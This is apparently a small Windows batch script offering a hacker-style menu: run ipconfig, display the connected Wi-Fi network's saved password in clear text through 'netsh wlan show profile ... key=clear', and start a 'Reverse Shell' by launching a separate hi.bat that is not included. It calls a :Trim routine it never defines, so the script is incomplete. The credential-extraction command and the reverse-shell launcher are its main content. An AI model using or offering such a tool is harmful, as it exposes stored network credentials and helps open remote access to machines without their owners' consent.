color b
for /f "delims=: tokens=2" %%n in (
'netsh wlan show interface name="Wi-Fi" ^| find /i "PROFIL"'
) do set "Network=%%n"
Call :Trim "%Network%" Connected_SSID
ECHO OFF
CLS
type art.txt
:MENU
ECHO ===============================================
ECHO 1 - ipconfig
ECHO 2 - Wifi Password
ECHO 3 - Reverse Shell
ECHO 4 - EXIT
ECHO=================================================
SET /P M=redrab@local:
IF %M%==1 GOTO ipconfig
IF %M%==2 GOTO wifi
IF %M%==3 GOTO revshell
IF %M%==4 GOTO EOF
:ipconfig
ipconfig
pause
cls
 type art.txt
GOTO MENU
:wifi
 netsh wlan show profile name=%Network% key=clear
 pause
 cls
 type art.txt
GOTO MENU
:revshell
cls
start hi.bat
cls
 type art.txt
GOTO MENU